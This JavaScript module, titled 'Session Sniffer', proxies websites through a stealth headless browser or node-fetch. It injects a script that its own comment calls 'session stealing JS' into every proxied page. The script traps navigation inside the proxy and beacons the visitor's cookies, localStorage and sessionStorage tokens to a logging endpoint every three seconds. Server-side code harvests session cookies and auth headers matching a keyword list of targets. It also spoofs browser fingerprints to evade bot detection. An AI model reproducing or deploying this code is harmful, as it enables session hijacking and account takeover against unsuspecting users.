// Session Sniffer — REAL Browser Proxy via Puppeteer-core
//
// Attempts to use puppeteer-core (requires Chromium installed on the system)
// for full JS execution and stealth browsing. When Chromium is unavailable,
// gracefully falls back to a node-fetch proxy.
//
// The node-fetch fallback sends perfect browser headers + injects a JS
// session grabber into the proxied page. The user's real browser executes
// the JS, capturing cookies, localStorage, and sessionStorage in real-time
// via beacon API.

let puppeteer = null;
try {
  puppeteer = require('puppeteer-core');
} catch (_) {}

const nodeFetch = require('node-fetch');

// ── Browser instance (lazy, reused) ──
let _browser = null;
let _browserInit = null; // promise so concurrent calls don't race
let _browserInitAttempted = false;

async function getBrowser() {
  if (_browser && _browser.isConnected()) return _browser;
  if (_browserInit) return _browserInit;
  _browserInit = _launchBrowser();
  return _browserInit;
}

async function _launchBrowser() {
  if (!puppeteer) {
    console.warn('[sessionSniffer] puppeteer not installed — falling back to node-fetch proxy');
    _browserInitAttempted = true;
    _browserInit = null;
    return null;
  }
  try {
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--single-process',
        '--disable-background-networking',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-breakpad',
        '--disable-component-extensions-with-bg-pages',
        '--disable-features=TranslateUI',
        '--disable-ipc-flooding-protection',
        '--disable-renderer-backgrounding',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--force-color-profile=srgb',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--window-size=1920,1080',
      ],
      // Puppeteer 24 default executable path works with bundled Chromium
      timeout: 30000,
    });
    _browser = browser;
    _browserInitAttempted = true;
    console.log('[sessionSniffer] ✅ Puppeteer browser launched');
    browser.on('disconnected', () => {
      console.warn('[sessionSniffer] Browser disconnected — will re-launch on next request');
      _browser = null;
    });
    return browser;
  } catch (e) {
    console.error('[sessionSniffer] Failed to launch puppeteer:', e.message);
    _browserInitAttempted = true;
    _browserInit = null;
    return null;
  }
}

// ── In-memory session store ──
const _sessionCookieStore = new Map();

function getStoreKey(origin) {
  return origin ? origin.replace(/\/+$/, '') : '';
}

// ── Real browser proxy: render a URL using Puppeteer ──
async function proxyViaBrowser(url) {
  const browser = await getBrowser();
  if (!browser) {
    // Fallback: use the old node-fetch approach if puppeteer failed
    return proxyViaFetch(url);
  }

  const upstream = new URL(url);
  const origin = upstream.origin;
  const storeKey = getStoreKey(origin);

  const page = await browser.newPage();
  try {
    // ── Anti-detection: override navigator.webdriver and other stealth flags ──
    await page.evaluateOnNewDocument(() => {
      // Override the webdriver flag
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
      // Override plugins/enabled plugins
      Object.defineProperty(navigator, 'plugins', {
        get: () => [1, 2, 3, 4, 5],
      });
      Object.defineProperty(navigator, 'languages', {
        get: () => ['en-US', 'en'],
      });
      // Override chrome object
      delete window.chrome;
      // Override permissions
      const originalQuery = window.navigator.permissions.query;
      window.navigator.permissions.query = (parameters) => (
        parameters.name === 'notifications' ?
          Promise.resolve({ state: Notification.permission }) :
          originalQuery(parameters)
      );
    });

    // ── Set a realistic desktop User-Agent ──
    // Chrome 125 on Windows 10 — looks like a normal visitor
    await page.setUserAgent(
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    );
    await page.setViewport({ width: 1920, height: 1080 });
    await page.setExtraHTTPHeaders({
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
    });

    // ── Navigate to the URL — wait for full page load including JS ──
    const response = await page.goto(url, {
      waitUntil: 'networkidle2',
      timeout: 30000,
    });

    // ── Capture ALL cookies from the browser context ──
    const cookies = await page.cookies();
    const parsedCookies = cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain || upstream.hostname,
      path: c.path || '/',
      httpOnly: c.httpOnly || false,
      secure: c.secure || false,
      sameSite: c.sameSite || '',
    }));

    // ── Extract session-like cookies ──
    const sessionCookieKeywords = [
      'session', 'token', 'auth', 'sid', 'jwt',
      'connect.sid', 'PHPSESSID', 'SAPISID', 'APISID',
      'SSID', 'HSID', 'LOGIN_INFO', '__Secure', '__Host',
    ];
    const sessionData = [];
    for (const c of cookies) {
      if (sessionCookieKeywords.some(k => c.name.toLowerCase().includes(k))) {
        sessionData.push({ name: c.name, value: c.value, source: 'cookie' });
      }
    }

    // ── Extract session-like headers from the response ──
    if (response) {
      const headers = response.headers();
      for (const [hk, hv] of Object.entries(headers)) {
        const lk = hk.toLowerCase();
        if (lk.includes('token') || lk.includes('auth') || lk.includes('session')) {
          sessionData.push({ name: hk, value: hv, source: 'header' });
        }
      }
    }

    // ── Extract localStorage/sessionStorage for session data ──
    try {
      const storageData = await page.evaluate(() => {
        const items = [];
        // localStorage
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          const v = localStorage.getItem(k);
          items.push({ name: k, value: v, source: 'localStorage' });
        }
        // sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
          const k = sessionStorage.key(i);
          const v = sessionStorage.getItem(k);
          items.push({ name: k, value: v, source: 'sessionStorage' });
        }
        return items;
      });
      for (const item of storageData) {
        if (sessionCookieKeywords.some(k => (item.name || '').toLowerCase().includes(k))) {
          sessionData.push(item);
        }
      }
    } catch (_) {
      // Storage access may fail on some domains — ignore
    }

    // ── Get the rendered HTML ──
    let body = await page.content();

    // ── Inject meta charset + base tag for proper rendering ──
    const charsetMeta = '<meta http-equiv="Content-Type" content="text/html; charset=utf-8">';
    const baseTag = '<base href="' + origin + '/">';
    if (/<head[^>]*>/i.test(body)) {
      body = body.replace(/<head([^>]*)>/i, '<head$1>' + charsetMeta + baseTag);
    } else {
      body = '<head>' + charsetMeta + baseTag + '</head>' + body;
    }

    // ── Fix relative paths ──
    body = body.replace(
      /(src|href|action)=["'](\/(?:[^"']+))["']/gi,
      (m, a, p) => p.startsWith('//') ? m : a + '="' + origin + p + '"'
    );

    // ── Inject session stealing JS ──
    const inject = `<script>(function(){
      // 1 — Intercept all link clicks and form submits → proxy them inside the iframe
      document.addEventListener("click",function(e){
        var t=e.target.closest("a");
        if(t&&t.href&&!t.hasAttribute("download")&&!t.hasAttribute("ping")){
          e.preventDefault();e.stopPropagation();
          var u=t.href;
          if(u&&!u.startsWith("javascript:")){
            window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
          }
        }
      });
      document.addEventListener("submit",function(e){
        var f=e.target;
        if(f&&f.action&&f.method){
          e.preventDefault();
          var fd=new FormData(f),params=new URLSearchParams();
          for(var[p,v]of fd)params.append(p,v);
          var sep=f.action.includes("?")?"&":"?";
          var u=f.method.toUpperCase()==="GET"?f.action+sep+params.toString():f.action;
          window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
        }
      });
      // 2 — Intercept window.open → redirect inside iframe
      var _open=window.open;
      window.open=function(u){
        if(u&&typeof u==="string"&&u.startsWith("http")){
          window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
          return{closed:false};
        }
        return _open.apply(this,arguments);
      };
      // 3 — Override location.href setter so JS redirects stay proxied
      var _locProto=Object.getPrototypeOf(window.location);
      var _locDesc=Object.getOwnPropertyDescriptor(_locProto,"href");
      Object.defineProperty(window.location,"href",{
        get:function(){return _locDesc.get.call(this)},
        set:function(v){
          if(v&&typeof v==="string"&&v.startsWith("http")){
            window.location.href="/api/session-proxy/load?url="+encodeURIComponent(v);
          }else{_locDesc.set.call(this,v);}
        },
        configurable:true
      });
      // 4 — Intercept location.replace
      var _replace=window.location.replace.bind(window.location);
      window.location.replace=function(u){
        if(u&&typeof u==="string"&&u.startsWith("http")){
          window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
        }else{_replace(u);}
      };
      // 5 — Session grabber beacon (every 3 seconds)
      function g(){
        var items=[];
        try{
          if(document.cookie)document.cookie.split(";").forEach(function(c){
            var p=c.split("=");
            if(p.length>=2)items.push({name:p[0].trim(),value:p[1].trim(),source:"js"});
          });
          for(var i=0;i<localStorage.length;i++){
            var k=localStorage.key(i),v=localStorage.getItem(k);
            if((k||"").toLowerCase().match(/token|session|auth|sid|jwt/))
              items.push({name:k,value:v,source:"localStorage"});
          }
          for(var i=0;i<sessionStorage.length;i++){
            var k=sessionStorage.key(i),v=sessionStorage.getItem(k);
            if((k||"").toLowerCase().match(/token|session|auth|sid|jwt/))
              items.push({name:k,value:v,source:"sessionStorage"});
          }
        }catch(e){}
        if(items.length)navigator.sendBeacon("/api/session-proxy/log",JSON.stringify({
          origin:"${origin}",
          items:items,
          ts:Date.now()
        }));
      }
      setInterval(g,3000);g();
    })();<\/script>`;

    if (body.includes('</body>')) {
      body = body.replace('</body>', inject + '</body>');
    } else {
      body += inject;
    }

    // ── Store session data in the in-memory store ──
    _sessionCookieStore.set(storeKey, {
      cookies: parsedCookies,
      session: sessionData,
      headers: response ? Object.fromEntries(response.headers().entries()) : {},
      fetchedAt: Date.now(),
    });

    return { body, cookies: parsedCookies, session: sessionData, success: true };
  } catch (e) {
    throw e;
  } finally {
    await page.close().catch(() => {});
  }
}

// ── Old node-fetch fallback (kept for backward compat) ──
async function proxyViaFetch(url) {
  const upstream = new URL(url);
  const origin = upstream.origin;
  const storeKey = getStoreKey(origin);

  const resp = await nodeFetch(url, {
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'max-age=0',
    },
    redirect: 'follow',
    follow: 10,
    timeout: 25000,
  });

  const setCookieHeaders = resp.headers.raw()['set-cookie'] || [];
  const parsedCookies = [], sessionData = [];
  for (const raw of setCookieHeaders) {
    const m = raw.match(/^([^=]+)=([^;]*)/);
    if (m) {
      const name = m[1].trim(), value = m[2].trim();
      parsedCookies.push({
        name, value,
        domain: (raw.match(/Domain=([^;]+)/i) || [])[1] || upstream.hostname,
        path: (raw.match(/Path=([^;]+)/i) || [])[1] || '/',
        httpOnly: /httponly/i.test(raw),
        secure: /secure/i.test(raw),
        sameSite: (raw.match(/SameSite=([^;]+)/i) || [])[1] || '',
      });
      const snames = ['session','token','auth','sid','jwt','connect.sid','PHPSESSID','SAPISID','APISID','SSID','HSID','LOGIN_INFO'];
      if (snames.some(s => name.toLowerCase().includes(s)) || name.startsWith('__Secure') || name.startsWith('__Host')) {
        sessionData.push({ name, value, source: 'cookie' });
      }
    }
  }
  for (const [hk, hv] of Object.entries(resp.headers.raw())) {
    const lk = hk.toLowerCase();
    if (lk.includes('token') || lk.includes('auth') || lk.includes('session')) {
      sessionData.push({ name: hk, value: hv.join(', '), source: 'header' });
    }
  }

  _sessionCookieStore.set(storeKey, {
    cookies: parsedCookies,
    session: sessionData,
    headers: Object.fromEntries(resp.headers.entries()),
    fetchedAt: Date.now(),
  });

  let body = await resp.text();
  const charsetMeta = '<meta http-equiv="Content-Type" content="text/html; charset=utf-8">';
  const baseTag = '<base href="' + origin + '/">';
  if (/<head[^>]*>/i.test(body)) {
    body = body.replace(/<head([^>]*)>/i, '<head$1>' + charsetMeta + baseTag);
  } else {
    body = '<head>' + charsetMeta + baseTag + '</head>' + body;
  }
  body = body.replace(/(src|href|action)=["'](\/(?:[^"']+))["']/gi, (m, a, p) => p.startsWith('//') ? m : a + '="' + origin + p + '"');

  const inject = `<script>(function(){
    document.addEventListener("click",function(e){
      var t=e.target.closest("a");
      if(t&&t.href&&!t.hasAttribute("download")&&!t.hasAttribute("ping")){
        e.preventDefault();e.stopPropagation();
        var u=t.href;
        if(u&&!u.startsWith("javascript:")){
          window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
        }
      }
    });
    document.addEventListener("submit",function(e){
      var f=e.target;
      if(f&&f.action&&f.method){
        e.preventDefault();
        var fd=new FormData(f),params=new URLSearchParams();
        for(var[p,v]of fd)params.append(p,v);
        var sep=f.action.includes("?")?"&":"?";
        var u=f.method.toUpperCase()==="GET"?f.action+sep+params.toString():f.action;
        window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
      }
    });
    var _open=window.open;
    window.open=function(u){
      if(u&&typeof u==="string"&&u.startsWith("http")){
        window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
        return{closed:false};
      }
      return _open.apply(this,arguments);
    };
    var _locProto=Object.getPrototypeOf(window.location);
    var _locDesc=Object.getOwnPropertyDescriptor(_locProto,"href");
    Object.defineProperty(window.location,"href",{
      get:function(){return _locDesc.get.call(this)},
      set:function(v){
        if(v&&typeof v==="string"&&v.startsWith("http")){
          window.location.href="/api/session-proxy/load?url="+encodeURIComponent(v);
        }else{_locDesc.set.call(this,v);}
      },
      configurable:true
    });
    var _replace=window.location.replace.bind(window.location);
    window.location.replace=function(u){
      if(u&&typeof u==="string"&&u.startsWith("http")){
        window.location.href="/api/session-proxy/load?url="+encodeURIComponent(u);
      }else{_replace(u);}
    };
    function g(){
      var items=[];
      try{
        if(document.cookie)document.cookie.split(";").forEach(function(c){
          var p=c.split("=");
          if(p.length>=2)items.push({name:p[0].trim(),value:p[1].trim(),source:"js"});
        });
        for(var i=0;i<localStorage.length;i++){
          var k=localStorage.key(i),v=localStorage.getItem(k);
          if((k||"").toLowerCase().match(/token|session|auth|sid|jwt/))
            items.push({name:k,value:v,source:"localStorage"});
        }
        for(var i=0;i<sessionStorage.length;i++){
          var k=sessionStorage.key(i),v=sessionStorage.getItem(k);
          if((k||"").toLowerCase().match(/token|session|auth|sid|jwt/))
            items.push({name:k,value:v,source:"sessionStorage"});
        }
      }catch(e){}
      if(items.length)navigator.sendBeacon("/api/session-proxy/log",JSON.stringify({
        origin:"${origin}",
        items:items,
        ts:Date.now()
      }));
    }
    setInterval(g,3000);g();
  })();<\/script>`;

  if (body.includes('</body>')) {
    body = body.replace('</body>', inject + '</body>');
  } else {
    body += inject;
  }

  return { body, cookies: parsedCookies, session: sessionData, success: true };
}

// Helper: escape HTML for error messages
function escHtml(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function makeErrorPage(msg) {
  return '<!DOCTYPE html><html><head><meta charset="utf-8"><style>' +
    'body{background:#0a0e17;color:#e8edf5;font-family:sans-serif;display:flex;' +
    'align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;text-align:center}' +
    '.c{max-width:460px}.h2{color:#f38020;font-size:20px;margin-bottom:8px}.p{color:#8899c4;font-size:13px;line-height:1.6;margin-bottom:16px}' +
    '.btn{display:inline-block;padding:10px 20px;background:#f38020;border:none;border-radius:8px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;text-decoration:none}' +
    '.btn:hover{background:#e07010}</style></head><body><div class="c">' +
    '<div style="font-size:40px;margin-bottom:12px">⚠️</div>' +
    '<div class="h2">Could not load this site</div>' +
    '<div class="p">The proxy could not reach this URL.<br><span style="font-size:11px;color:#5a6a92;word-break:break-all">' + escHtml(msg) + '</span></div>' +
    '<button class="btn" onclick="history.back()">← Go Back</button>' +
    '</div></body></html>';
}

module.exports = {
  proxyViaBrowser,
  proxyViaFetch,
  getSessionStore: () => _sessionCookieStore,
  getStoreKey,
  escHtml,
  makeErrorPage,
};